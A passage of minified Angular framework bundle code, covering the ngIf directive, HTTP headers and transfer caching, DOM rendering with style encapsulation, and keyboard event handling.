                this._elseTemplateRef,
                this._context
              )));
      }
      static ngTemplateContextGuard(n, r) {
        return !0;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(P(Ue), P(Le));
      }),
      (e.ɵdir = be({
        type: e,
        selectors: [["", "ngIf", ""]],
        inputs: { ngIf: "ngIf", ngIfThen: "ngIfThen", ngIfElse: "ngIfElse" },
        standalone: !0,
      })),
      e
    );
  })(),
  Bl = class {
    constructor() {
      (this.$implicit = null), (this.ngIf = null);
    }
  };
function Ig(t, e) {
  if (e && !e.createEmbeddedView)
    throw new Error(`${t} must be a TemplateRef, but received '${we(e)}'.`);
}
var Fg = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({})),
      e
    );
  })(),
  Yl = "browser",
  DM = "server";
function lr(t) {
  return t === Yl;
}
function ur(t) {
  return t === DM;
}
var Lg = (() => {
    let e = class e {};
    return (
      (e.ɵprov = y({
        token: e,
        providedIn: "root",
        factory: () => (lr(v(Me)) ? new Ul(v(T), window) : new $l()),
      })),
      e
    );
  })(),
  Ul = class {
    constructor(e, i) {
      (this.document = e), (this.window = i), (this.offset = () => [0, 0]);
    }
    setOffset(e) {
      Array.isArray(e) ? (this.offset = () => e) : (this.offset = e);
    }
    getScrollPosition() {
      return [this.window.scrollX, this.window.scrollY];
    }
    scrollToPosition(e) {
      this.window.scrollTo(e[0], e[1]);
    }
    scrollToAnchor(e) {
      let i = xM(this.document, e);
      i && (this.scrollToElement(i), i.focus());
    }
    setHistoryScrollRestoration(e) {
      this.window.history.scrollRestoration = e;
    }
    scrollToElement(e) {
      let i = e.getBoundingClientRect(),
        n = i.left + this.window.pageXOffset,
        r = i.top + this.window.pageYOffset,
        o = this.offset();
      this.window.scrollTo(n - o[0], r - o[1]);
    }
  };
function xM(t, e) {
  let i = t.getElementById(e) || t.getElementsByName(e)[0];
  if (i) return i;
  if (
    "function" == typeof t.createTreeWalker &&
    t.body &&
    "function" == typeof t.body.attachShadow
  ) {
    let n = t.createTreeWalker(t.body, NodeFilter.SHOW_ELEMENT),
      r = n.currentNode;
    for (; r; ) {
      let o = r.shadowRoot;
      if (o) {
        let s = o.getElementById(e) || o.querySelector(`[name="${e}"]`);
        if (s) return s;
      }
      r = n.nextNode();
    }
  }
  return null;
}
var $l = class {
    setOffset(e) {}
    getScrollPosition() {
      return [0, 0];
    }
    scrollToPosition(e) {}
    scrollToAnchor(e) {}
    setHistoryScrollRestoration(e) {}
  },
  Vs = class {},
  Us = class t {
    constructor(e) {
      (this.normalizedNames = new Map()),
        (this.lazyUpdate = null),
        e
          ? "string" == typeof e
            ? (this.lazyInit = () => {
                (this.headers = new Map()),
                  e.split("\n").forEach((i) => {
                    let n = i.indexOf(":");
                    if (n > 0) {
                      let r = i.slice(0, n),
                        o = r.toLowerCase(),
                        s = i.slice(n + 1).trim();
                      this.maybeSetNormalizedName(r, o),
                        this.headers.has(o)
                          ? this.headers.get(o).push(s)
                          : this.headers.set(o, [s]);
                    }
                  });
              })
            : typeof Headers < "u" && e instanceof Headers
            ? ((this.headers = new Map()),
              e.forEach((i, n) => {
                this.setHeaderEntries(n, i);
              }))
            : (this.lazyInit = () => {
                (this.headers = new Map()),
                  Object.entries(e).forEach(([i, n]) => {
                    this.setHeaderEntries(i, n);
                  });
              })
          : (this.headers = new Map());
    }
    has(e) {
      return this.init(), this.headers.has(e.toLowerCase());
    }
    get(e) {
      this.init();
      let i = this.headers.get(e.toLowerCase());
      return i && i.length > 0 ? i[0] : null;
    }
    keys() {
      return this.init(), Array.from(this.normalizedNames.values());
    }
    getAll(e) {
      return this.init(), this.headers.get(e.toLowerCase()) || null;
    }
    append(e, i) {
      return this.clone({ name: e, value: i, op: "a" });
    }
    set(e, i) {
      return this.clone({ name: e, value: i, op: "s" });
    }
    delete(e, i) {
      return this.clone({ name: e, value: i, op: "d" });
    }
    maybeSetNormalizedName(e, i) {
      this.normalizedNames.has(i) || this.normalizedNames.set(i, e);
    }
    init() {
      this.lazyInit &&
        (this.lazyInit instanceof t
          ? this.copyFrom(this.lazyInit)
          : this.lazyInit(),
        (this.lazyInit = null),
        this.lazyUpdate &&
          (this.lazyUpdate.forEach((e) => this.applyUpdate(e)),
          (this.lazyUpdate = null)));
    }
    copyFrom(e) {
      e.init(),
        Array.from(e.headers.keys()).forEach((i) => {
          this.headers.set(i, e.headers.get(i)),
            this.normalizedNames.set(i, e.normalizedNames.get(i));
        });
    }
    clone(e) {
      let i = new t();
      return (
        (i.lazyInit =
          this.lazyInit && this.lazyInit instanceof t ? this.lazyInit : this),
        (i.lazyUpdate = (this.lazyUpdate || []).concat([e])),
        i
      );
    }
    applyUpdate(e) {
      let i = e.name.toLowerCase();
      switch (e.op) {
        case "a":
        case "s":
          let n = e.value;
          if (("string" == typeof n && (n = [n]), 0 === n.length)) return;
          this.maybeSetNormalizedName(e.name, i);
          let r = ("a" === e.op ? this.headers.get(i) : void 0) || [];
          r.push(...n), this.headers.set(i, r);
          break;
        case "d":
          let o = e.value;
          if (o) {
            let s = this.headers.get(i);
            if (!s) return;
            (s = s.filter((a) => -1 === o.indexOf(a))),
              0 === s.length
                ? (this.headers.delete(i), this.normalizedNames.delete(i))
                : this.headers.set(i, s);
          } else this.headers.delete(i), this.normalizedNames.delete(i);
      }
    }
    setHeaderEntries(e, i) {
      let n = (Array.isArray(i) ? i : [i]).map((o) => o.toString()),
        r = e.toLowerCase();
      this.headers.set(r, n), this.maybeSetNormalizedName(e, r);
    }
    forEach(e) {
      this.init(),
        Array.from(this.normalizedNames.keys()).forEach((i) =>
          e(this.normalizedNames.get(i), this.headers.get(i))
        );
    }
  },
  Wg = (function (t) {
    return (
      (t[(t.Sent = 0)] = "Sent"),
      (t[(t.UploadProgress = 1)] = "UploadProgress"),
      (t[(t.ResponseHeader = 2)] = "ResponseHeader"),
      (t[(t.DownloadProgress = 3)] = "DownloadProgress"),
      (t[(t.Response = 4)] = "Response"),
      (t[(t.User = 5)] = "User"),
      t
    );
  })(Wg || {}),
  Zl = class {
    constructor(e, i = Gg.Ok, n = "OK") {
      (this.headers = e.headers || new Us()),
        (this.status = void 0 !== e.status ? e.status : i),
        (this.statusText = e.statusText || n),
        (this.url = e.url || null),
        (this.ok = this.status >= 200 && this.status < 300);
    }
  },
  $s = class t extends Zl {
    constructor(e = {}) {
      super(e),
        (this.type = Wg.Response),
        (this.body = void 0 !== e.body ? e.body : null);
    }
    clone(e = {}) {
      return new t({
        body: void 0 !== e.body ? e.body : this.body,
        headers: e.headers || this.headers,
        status: void 0 !== e.status ? e.status : this.status,
        statusText: e.statusText || this.statusText,
        url: e.url || this.url || void 0,
      });
    }
  },
  Gg = (function (t) {
    return (
      (t[(t.Continue = 100)] = "Continue"),
      (t[(t.SwitchingProtocols = 101)] = "SwitchingProtocols"),
      (t[(t.Processing = 102)] = "Processing"),
      (t[(t.EarlyHints = 103)] = "EarlyHints"),
      (t[(t.Ok = 200)] = "Ok"),
      (t[(t.Created = 201)] = "Created"),
      (t[(t.Accepted = 202)] = "Accepted"),
      (t[(t.NonAuthoritativeInformation = 203)] =
        "NonAuthoritativeInformation"),
      (t[(t.NoContent = 204)] = "NoContent"),
      (t[(t.ResetContent = 205)] = "ResetContent"),
      (t[(t.PartialContent = 206)] = "PartialContent"),
      (t[(t.MultiStatus = 207)] = "MultiStatus"),
      (t[(t.AlreadyReported = 208)] = "AlreadyReported"),
      (t[(t.ImUsed = 226)] = "ImUsed"),
      (t[(t.MultipleChoices = 300)] = "MultipleChoices"),
      (t[(t.MovedPermanently = 301)] = "MovedPermanently"),
      (t[(t.Found = 302)] = "Found"),
      (t[(t.SeeOther = 303)] = "SeeOther"),
      (t[(t.NotModified = 304)] = "NotModified"),
      (t[(t.UseProxy = 305)] = "UseProxy"),
      (t[(t.Unused = 306)] = "Unused"),
      (t[(t.TemporaryRedirect = 307)] = "TemporaryRedirect"),
      (t[(t.PermanentRedirect = 308)] = "PermanentRedirect"),
      (t[(t.BadRequest = 400)] = "BadRequest"),
      (t[(t.Unauthorized = 401)] = "Unauthorized"),
      (t[(t.PaymentRequired = 402)] = "PaymentRequired"),
      (t[(t.Forbidden = 403)] = "Forbidden"),
      (t[(t.NotFound = 404)] = "NotFound"),
      (t[(t.MethodNotAllowed = 405)] = "MethodNotAllowed"),
      (t[(t.NotAcceptable = 406)] = "NotAcceptable"),
      (t[(t.ProxyAuthenticationRequired = 407)] =
        "ProxyAuthenticationRequired"),
      (t[(t.RequestTimeout = 408)] = "RequestTimeout"),
      (t[(t.Conflict = 409)] = "Conflict"),
      (t[(t.Gone = 410)] = "Gone"),
      (t[(t.LengthRequired = 411)] = "LengthRequired"),
      (t[(t.PreconditionFailed = 412)] = "PreconditionFailed"),
      (t[(t.PayloadTooLarge = 413)] = "PayloadTooLarge"),
      (t[(t.UriTooLong = 414)] = "UriTooLong"),
      (t[(t.UnsupportedMediaType = 415)] = "UnsupportedMediaType"),
      (t[(t.RangeNotSatisfiable = 416)] = "RangeNotSatisfiable"),
      (t[(t.ExpectationFailed = 417)] = "ExpectationFailed"),
      (t[(t.ImATeapot = 418)] = "ImATeapot"),
      (t[(t.MisdirectedRequest = 421)] = "MisdirectedRequest"),
      (t[(t.UnprocessableEntity = 422)] = "UnprocessableEntity"),
      (t[(t.Locked = 423)] = "Locked"),
      (t[(t.FailedDependency = 424)] = "FailedDependency"),
      (t[(t.TooEarly = 425)] = "TooEarly"),
      (t[(t.UpgradeRequired = 426)] = "UpgradeRequired"),
      (t[(t.PreconditionRequired = 428)] = "PreconditionRequired"),
      (t[(t.TooManyRequests = 429)] = "TooManyRequests"),
      (t[(t.RequestHeaderFieldsTooLarge = 431)] =
        "RequestHeaderFieldsTooLarge"),
      (t[(t.UnavailableForLegalReasons = 451)] = "UnavailableForLegalReasons"),
      (t[(t.InternalServerError = 500)] = "InternalServerError"),
      (t[(t.NotImplemented = 501)] = "NotImplemented"),
      (t[(t.BadGateway = 502)] = "BadGateway"),
      (t[(t.ServiceUnavailable = 503)] = "ServiceUnavailable"),
      (t[(t.GatewayTimeout = 504)] = "GatewayTimeout"),
      (t[(t.HttpVersionNotSupported = 505)] = "HttpVersionNotSupported"),
      (t[(t.VariantAlsoNegotiates = 506)] = "VariantAlsoNegotiates"),
      (t[(t.InsufficientStorage = 507)] = "InsufficientStorage"),
      (t[(t.LoopDetected = 508)] = "LoopDetected"),
      (t[(t.NotExtended = 510)] = "NotExtended"),
      (t[(t.NetworkAuthenticationRequired = 511)] =
        "NetworkAuthenticationRequired"),
      t
    );
  })(Gg || {}),
  OM = new b(""),
  jg = "b",
  Vg = "h",
  Bg = "s",
  Ug = "st",
  $g = "u",
  Hg = "rt",
  Bs = new b(""),
  IM = ["GET", "HEAD"];
function PM(t, e) {
  let d = v(Bs),
    { isCacheActive: i } = d,
    n = wd(d, ["isCacheActive"]),
    { transferCache: r, method: o } = t;
  if (
    !i ||
    ("POST" === o && !n.includePostRequests && !r) ||
    ("POST" !== o && !IM.includes(o)) ||
    !1 === r ||
    !1 === n.filter?.(t)
  )
    return e(t);
  let s = v(gn),
    a = TM(t),
    c = s.get(a, null),
    l = n.includeHeaders;
  if (("object" == typeof r && r.includeHeaders && (l = r.includeHeaders), c)) {
    let { [jg]: f, [Hg]: m, [Vg]: w, [Bg]: M, [Ug]: G, [$g]: H } = c,
      me = f;
    switch (m) {
      case "arraybuffer":
        me = new TextEncoder().encode(f).buffer;
        break;
      case "blob":
        me = new Blob([f]);
    }
    let ve = new Us(w);
    return x(
      new $s({ body: me, headers: ve, status: M, statusText: G, url: H })
    );
  }
  let u = ur(v(Me));
  return e(t).pipe(
    ce((f) => {
      f instanceof $s &&
        u &&
        s.set(a, {
          [jg]: f.body,
          [Vg]: SM(f.headers, l),
          [Bg]: f.status,
          [Ug]: f.statusText,
          [$g]: f.url || "",
          [Hg]: t.responseType,
        });
    })
  );
}
function SM(t, e) {
  if (!e) return {};
  let i = {};
  for (let n of e) {
    let r = t.getAll(n);
    null !== r && (i[n] = r);
  }
  return i;
}
function zg(t) {
  return [...t.keys()]
    .sort()
    .map((e) => `${e}=${t.getAll(e)}`)
    .join("&");
}
function TM(t) {
  let { params: e, method: i, responseType: n, url: r } = t,
    o = zg(e),
    s = t.serializeBody();
  return (
    s instanceof URLSearchParams
      ? (s = zg(s))
      : "string" != typeof s && (s = ""),
    AM([i, n, r, s, o].join("|"))
  );
}
function AM(t) {
  let e = 0;
  for (let i of t) e = (Math.imul(31, e) + i.charCodeAt(0)) | 0;
  return (e += 2147483648), e.toString();
}
function qg(t) {
  return [
    {
      provide: Bs,
      useFactory: () => (
        si("NgHttpTransferCache"), C({ isCacheActive: !0 }, t)
      ),
    },
    { provide: OM, useValue: PM, multi: !0, deps: [gn, Bs] },
    {
      provide: ai,
      multi: !0,
      useFactory: () => {
        let e = v(tt),
          i = v(Bs);
        return () => {
          Ll(e).then(() => {
            i.isCacheActive = !1;
          });
        };
      },
    },
  ];
}
var Xl = class extends js {
    constructor() {
      super(...arguments), (this.supportsDOMEvents = !0);
    }
  },
  Jl = class t extends Xl {
    static makeCurrent() {
      Sg(new t());
    }
    onAndCancel(e, i, n) {
      return (
        e.addEventListener(i, n),
        () => {
          e.removeEventListener(i, n);
        }
      );
    }
    dispatchEvent(e, i) {
      e.dispatchEvent(i);
    }
    remove(e) {
      e.parentNode && e.parentNode.removeChild(e);
    }
    createElement(e, i) {
      return (i = i || this.getDefaultDocument()).createElement(e);
    }
    createHtmlDocument() {
      return document.implementation.createHTMLDocument("fakeTitle");
    }
    getDefaultDocument() {
      return document;
    }
    isElementNode(e) {
      return e.nodeType === Node.ELEMENT_NODE;
    }
    isShadowRoot(e) {
      return e instanceof DocumentFragment;
    }
    getGlobalEventTarget(e, i) {
      return "window" === i
        ? window
        : "document" === i
        ? e
        : "body" === i
        ? e.body
        : null;
    }
    getBaseHref(e) {
      let i = RM();
      return null == i ? null : NM(i);
    }
    resetBaseElement() {
      fr = null;
    }
    getUserAgent() {
      return window.navigator.userAgent;
    }
    getCookie(e) {
      return ql(document.cookie, e);
    }
  },
  fr = null;
function RM() {
  return (fr = fr || document.querySelector("base"))
    ? fr.getAttribute("href")
    : null;
}
function NM(t) {
  return new URL(t, document.baseURI).pathname;
}
var eu = class {
    addToWindow(e) {
      (Ce.getAngularTestability = (n, r = !0) => {
        let o = e.findTestabilityInTree(n, r);
        if (null == o) throw new D(5103, !1);
        return o;
      }),
        (Ce.getAllAngularTestabilities = () => e.getAllTestabilities()),
        (Ce.getAllAngularRootElements = () => e.getAllRootElements());
      Ce.frameworkStabilizers || (Ce.frameworkStabilizers = []),
        Ce.frameworkStabilizers.push((n) => {
          let r = Ce.getAllAngularTestabilities(),
            o = r.length,
            s = function () {
              o--, 0 == o && n();
            };
          r.forEach((a) => {
            a.whenStable(s);
          });
        });
    }
    findTestabilityInTree(e, i, n) {
      if (null == i) return null;
      return (
        e.getTestability(i) ??
        (n
          ? vn().isShadowRoot(i)
            ? this.findTestabilityInTree(e, i.host, !0)
            : this.findTestabilityInTree(e, i.parentElement, !0)
          : null)
      );
    }
  },
  kM = (() => {
    let e = class e {
      build() {
        return new XMLHttpRequest();
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  tu = new b(""),
  Kg = (() => {
    let e = class e {
      constructor(n, r) {
        (this._zone = r),
          (this._eventNameToPlugin = new Map()),
          n.forEach((o) => {
            o.manager = this;
          }),
          (this._plugins = n.slice().reverse());
      }
      addEventListener(n, r, o) {
        return this._findPluginFor(r).addEventListener(n, r, o);
      }
      getZone() {
        return this._zone;
      }
      _findPluginFor(n) {
        let r = this._eventNameToPlugin.get(n);
        if (r) return r;
        if (((r = this._plugins.find((s) => s.supports(n))), !r))
          throw new D(5101, !1);
        return this._eventNameToPlugin.set(n, r), r;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(tu), h(O));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  Hs = class {
    constructor(e) {
      this._doc = e;
    }
  },
  Ql = "ng-app-id",
  Xg = (() => {
    let e = class e {
      constructor(n, r, o, s = {}) {
        (this.doc = n),
          (this.appId = r),
          (this.nonce = o),
          (this.platformId = s),
          (this.styleRef = new Map()),
          (this.hostNodes = new Set()),
          (this.styleNodesInDOM = this.collectServerRenderedStyles()),
          (this.platformIsServer = ur(s)),
          this.resetHostNodes();
      }
      addStyles(n) {
        for (let r of n)
          1 === this.changeUsageCount(r, 1) && this.onStyleAdded(r);
      }
      removeStyles(n) {
        for (let r of n)
          this.changeUsageCount(r, -1) <= 0 && this.onStyleRemoved(r);
      }
      ngOnDestroy() {
        let n = this.styleNodesInDOM;
        n && (n.forEach((r) => r.remove()), n.clear());
        for (let r of this.getAllStyles()) this.onStyleRemoved(r);
        this.resetHostNodes();
      }
      addHost(n) {
        this.hostNodes.add(n);
        for (let r of this.getAllStyles()) this.addStyleToHost(n, r);
      }
      removeHost(n) {
        this.hostNodes.delete(n);
      }
      getAllStyles() {
        return this.styleRef.keys();
      }
      onStyleAdded(n) {
        for (let r of this.hostNodes) this.addStyleToHost(r, n);
      }
      onStyleRemoved(n) {
        let r = this.styleRef;
        r.get(n)?.elements?.forEach((o) => o.remove()), r.delete(n);
      }
      collectServerRenderedStyles() {
        let n = this.doc.head?.querySelectorAll(`style[${Ql}="${this.appId}"]`);
        if (n?.length) {
          let r = new Map();
          return (
            n.forEach((o) => {
              null != o.textContent && r.set(o.textContent, o);
            }),
            r
          );
        }
        return null;
      }
      changeUsageCount(n, r) {
        let o = this.styleRef;
        if (o.has(n)) {
          let s = o.get(n);
          return (s.usage += r), s.usage;
        }
        return o.set(n, { usage: r, elements: [] }), r;
      }
      getStyleElement(n, r) {
        let o = this.styleNodesInDOM,
          s = o?.get(r);
        if (s?.parentNode === n) return o.delete(r), s.removeAttribute(Ql), s;
        {
          let a = this.doc.createElement("style");
          return (
            this.nonce && a.setAttribute("nonce", this.nonce),
            (a.textContent = r),
            this.platformIsServer && a.setAttribute(Ql, this.appId),
            n.appendChild(a),
            a
          );
        }
      }
      addStyleToHost(n, r) {
        let o = this.getStyleElement(n, r),
          s = this.styleRef,
          a = s.get(r)?.elements;
        a ? a.push(o) : s.set(r, { elements: [o], usage: 1 });
      }
      resetHostNodes() {
        let n = this.hostNodes;
        n.clear(), n.add(this.doc.head);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T), h(ri), h(er, 8), h(Me));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  Kl = {
    svg: "http://www.w3.org/2000/svg",
    xhtml: "http://www.w3.org/1999/xhtml",
    xlink: "http://www.w3.org/1999/xlink",
    xml: "http://www.w3.org/XML/1998/namespace",
    xmlns: "http://www.w3.org/2000/xmlns/",
    math: "http://www.w3.org/1998/MathML/",
  },
  ru = /%COMP%/g,
  Jg = "%COMP%",
  FM = `_nghost-${Jg}`,
  LM = `_ngcontent-${Jg}`,
  jM = !0,
  VM = new b("", { providedIn: "root", factory: () => jM });
function BM(t) {
  return LM.replace(ru, t);
}
function UM(t) {
  return FM.replace(ru, t);
}
function em(t, e) {
  return e.map((i) => i.replace(ru, t));
}
var Yg = (() => {
    let e = class e {
      constructor(n, r, o, s, a, c, l, u = null) {
        (this.eventManager = n),
          (this.sharedStylesHost = r),
          (this.appId = o),
          (this.removeStylesOnCompDestroy = s),
          (this.doc = a),
          (this.platformId = c),
          (this.ngZone = l),
          (this.nonce = u),
          (this.rendererByCompId = new Map()),
          (this.platformIsServer = ur(c)),
          (this.defaultRenderer = new hr(n, a, l, this.platformIsServer));
      }
      createRenderer(n, r) {
        if (!n || !r) return this.defaultRenderer;
        this.platformIsServer &&
          r.encapsulation === lt.ShadowDom &&
          (r = Z(C({}, r), { encapsulation: lt.Emulated }));
        let o = this.getOrCreateRenderer(n, r);
        return (
          o instanceof zs
            ? o.applyToHost(n)
            : o instanceof pr && o.applyStyles(),
          o
        );
      }
      getOrCreateRenderer(n, r) {
        let o = this.rendererByCompId,
          s = o.get(r.id);
        if (!s) {
          let a = this.doc,
            c = this.ngZone,
            l = this.eventManager,
            u = this.sharedStylesHost,
            d = this.removeStylesOnCompDestroy,
            f = this.platformIsServer;
          switch (r.encapsulation) {
            case lt.Emulated:
              s = new zs(l, u, r, this.appId, d, a, c, f);
              break;
            case lt.ShadowDom:
              return new nu(l, u, n, r, a, c, this.nonce, f);
            default:
              s = new pr(l, u, r, d, a, c, f);
          }
          o.set(r.id, s);
        }
        return s;
      }
      ngOnDestroy() {
        this.rendererByCompId.clear();
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(
          h(Kg),
          h(Xg),
          h(ri),
          h(VM),
          h(T),
          h(Me),
          h(O),
          h(er)
        );
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  hr = class {
    constructor(e, i, n, r) {
      (this.eventManager = e),
        (this.doc = i),
        (this.ngZone = n),
        (this.platformIsServer = r),
        (this.data = Object.create(null)),
        (this.throwOnSyntheticProps = !0),
        (this.destroyNode = null);
    }
    destroy() {}
    createElement(e, i) {
      return i
        ? this.doc.createElementNS(Kl[i] || i, e)
        : this.doc.createElement(e);
    }
    createComment(e) {
      return this.doc.createComment(e);
    }
    createText(e) {
      return this.doc.createTextNode(e);
    }
    appendChild(e, i) {
      (Zg(e) ? e.content : e).appendChild(i);
    }
    insertBefore(e, i, n) {
      e && (Zg(e) ? e.content : e).insertBefore(i, n);
    }
    removeChild(e, i) {
      e && e.removeChild(i);
    }
    selectRootElement(e, i) {
      let n = "string" == typeof e ? this.doc.querySelector(e) : e;
      if (!n) throw new D(-5104, !1);
      return i || (n.textContent = ""), n;
    }
    parentNode(e) {
      return e.parentNode;
    }
    nextSibling(e) {
      return e.nextSibling;
    }
    setAttribute(e, i, n, r) {
      if (r) {
        i = r + ":" + i;
        let o = Kl[r];
        o ? e.setAttributeNS(o, i, n) : e.setAttribute(i, n);
      } else e.setAttribute(i, n);
    }
    removeAttribute(e, i, n) {
      if (n) {
        let r = Kl[n];
        r ? e.removeAttributeNS(r, i) : e.removeAttribute(`${n}:${i}`);
      } else e.removeAttribute(i);
    }
    addClass(e, i) {
      e.classList.add(i);
    }
    removeClass(e, i) {
      e.classList.remove(i);
    }
    setStyle(e, i, n, r) {
      r & (Mt.DashCase | Mt.Important)
        ? e.style.setProperty(i, n, r & Mt.Important ? "important" : "")
        : (e.style[i] = n);
    }
    removeStyle(e, i, n) {
      n & Mt.DashCase ? e.style.removeProperty(i) : (e.style[i] = "");
    }
    setProperty(e, i, n) {
      null != e && (e[i] = n);
    }
    setValue(e, i) {
      e.nodeValue = i;
    }
    listen(e, i, n) {
      if ("string" == typeof e && !(e = vn().getGlobalEventTarget(this.doc, e)))
        throw new Error(`Unsupported event target ${e} for event ${i}`);
      return this.eventManager.addEventListener(
        e,
        i,
        this.decoratePreventDefault(n)
      );
    }
    decoratePreventDefault(e) {
      return (i) => {
        if ("__ngUnwrap__" === i) return e;
        !1 ===
          (this.platformIsServer ? this.ngZone.runGuarded(() => e(i)) : e(i)) &&
          i.preventDefault();
      };
    }
  };
function Zg(t) {
  return "TEMPLATE" === t.tagName && void 0 !== t.content;
}
var nu = class extends hr {
    constructor(e, i, n, r, o, s, a, c) {
      super(e, o, s, c),
        (this.sharedStylesHost = i),
        (this.hostEl = n),
        (this.shadowRoot = n.attachShadow({ mode: "open" })),
        this.sharedStylesHost.addHost(this.shadowRoot);
      let l = em(r.id, r.styles);
      for (let u of l) {
        let d = document.createElement("style");
        a && d.setAttribute("nonce", a),
          (d.textContent = u),
          this.shadowRoot.appendChild(d);
      }
    }
    nodeOrShadowRoot(e) {
      return e === this.hostEl ? this.shadowRoot : e;
    }
    appendChild(e, i) {
      return super.appendChild(this.nodeOrShadowRoot(e), i);
    }
    insertBefore(e, i, n) {
      return super.insertBefore(this.nodeOrShadowRoot(e), i, n);
    }
    removeChild(e, i) {
      return super.removeChild(this.nodeOrShadowRoot(e), i);
    }
    parentNode(e) {
      return this.nodeOrShadowRoot(super.parentNode(this.nodeOrShadowRoot(e)));
    }
    destroy() {
      this.sharedStylesHost.removeHost(this.shadowRoot);
    }
  },
  pr = class extends hr {
    constructor(e, i, n, r, o, s, a, c) {
      super(e, o, s, a),
        (this.sharedStylesHost = i),
        (this.removeStylesOnCompDestroy = r),
        (this.styles = c ? em(c, n.styles) : n.styles);
    }
    applyStyles() {
      this.sharedStylesHost.addStyles(this.styles);
    }
    destroy() {
      this.removeStylesOnCompDestroy &&
        this.sharedStylesHost.removeStyles(this.styles);
    }
  },
  zs = class extends pr {
    constructor(e, i, n, r, o, s, a, c) {
      let l = r + "-" + n.id;
      super(e, i, n, o, s, a, c, l),
        (this.contentAttr = BM(l)),
        (this.hostAttr = UM(l));
    }
    applyToHost(e) {
      this.applyStyles(), this.setAttribute(e, this.hostAttr, "");
    }
    createElement(e, i) {
      let n = super.createElement(e, i);
      return super.setAttribute(n, this.contentAttr, ""), n;
    }
  },
  $M = (() => {
    let e = class e extends Hs {
      constructor(n) {
        super(n);
      }
      supports(n) {
        return !0;
      }
      addEventListener(n, r, o) {
        return (
          n.addEventListener(r, o, !1), () => this.removeEventListener(n, r, o)
        );
      }
      removeEventListener(n, r, o) {
        return n.removeEventListener(r, o);
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })(),
  Qg = ["alt", "control", "meta", "shift"],
  HM = {
    "\b": "Backspace",
    "\t": "Tab",
    "": "Delete",
    "": "Escape",
    Del: "Delete",
    Esc: "Escape",
    Left: "ArrowLeft",
    Right: "ArrowRight",
    Up: "ArrowUp",
    Down: "ArrowDown",
    Menu: "ContextMenu",
    Scroll: "ScrollLock",
    Win: "OS",
  },
  zM = {
    alt: (t) => t.altKey,
    control: (t) => t.ctrlKey,
    meta: (t) => t.metaKey,
    shift: (t) => t.shiftKey,
  },
  WM = (() => {
    let e = class e extends Hs {
      constructor(n) {
        super(n);
      }
      supports(n) {
        return null != e.parseEventName(n);
      }
      addEventListener(n, r, o) {
        let s = e.parseEventName(r),
          a = e.eventCallback(s.fullKey, o, this.manager.getZone());
        return this.manager
          .getZone()
          .runOutsideAngular(() => vn().onAndCancel(n, s.domEventName, a));
      }
      static parseEventName(n) {
        let r = n.toLowerCase().split("."),
          o = r.shift();
        if (0 === r.length || ("keydown" !== o && "keyup" !== o)) return null;
        let s = e._normalizeKey(r.pop()),
          a = "",
          c = r.indexOf("code");
        if (
          (c > -1 && (r.splice(c, 1), (a = "code.")),
          Qg.forEach((u) => {
            let d = r.indexOf(u);
            d > -1 && (r.splice(d, 1), (a += u + "."));
          }),
          (a += s),
          0 != r.length || 0 === s.length)
        )
          return null;
        let l = {};
        return (l.domEventName = o), (l.fullKey = a), l;
      }
      static matchEventFullKeyCode(n, r) {
        let o = HM[n.key] || n.key,
          s = "";
        return (
          r.indexOf("code.") > -1 && ((o = n.code), (s = "code.")),
          !(null == o || !o) &&
            ((o = o.toLowerCase()),
            " " === o ? (o = "space") : "." === o && (o = "dot"),
            Qg.forEach((a) => {
              if (a !== o) {
                (0, zM[a])(n) && (s += a + ".");
              }
            }),
            (s += o),
            s === r)
        );
      }
      static eventCallback(n, r, o) {
        return (s) => {
          e.matchEventFullKeyCode(s, n) && o.runGuarded(() => r(s));
        };
      }
      static _normalizeKey(n) {
        return "esc" === n ? "escape" : n;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })();
function GM() {
  Jl.makeCurrent();
}
function qM() {
  return new ut();
}
function YM() {
  return ap(document), document;
}
var ZM = [
    { provide: Me, useValue: Yl },
    { provide: pl, useValue: GM, multi: !0 },
    { provide: T, useFactory: YM, deps: [] },
  ],
  tm = jl(wg, "browser", ZM),
  QM = new b(""),
  KM = [
    { provide: ar, useClass: eu, deps: [] },
    { provide: kl, useClass: As, deps: [O, Rs, ar] },
    { provide: As, useClass: As, deps: [O, Rs, ar] },
  ],
  XM = [
    { provide: ds, useValue: "root" },
    { provide: ut, useFactory: qM, deps: [] },
    { provide: tu, useClass: $M, multi: !0, deps: [T, O, Me] },
    { provide: tu, useClass: WM, multi: !0, deps: [T] },
    Yg,
    Xg,
    Kg,
    { provide: $i, useExisting: Yg },
    { provide: Vs, useClass: kM, deps: [] },
    [],
  ],
  nm = (() => {
    let e = class e {
      constructor(n) {}
      static withServerTransition(n) {
        return { ngModule: e, providers: [{ provide: ri, useValue: n.appId }] };
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(QM, 12));
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ providers: [...XM, ...KM], imports: [Fg, bg] })),
      e
    );
  })(),
  im = (() => {
    let e = class e {
      constructor(n) {
        this._doc = n;
      }
      getTitle() {
        return this._doc.title;
      }
      setTitle(n) {
        this._doc.title = n || "";
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(T));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  iu = (function (t) {
    return (
      (t[(t.NoHttpTransferCache = 0)] = "NoHttpTransferCache"),
      (t[(t.HttpTransferCacheOptions = 1)] = "HttpTransferCacheOptions"),
      t
    );
  })(iu || {});
function rm(...t) {
  let e = [],
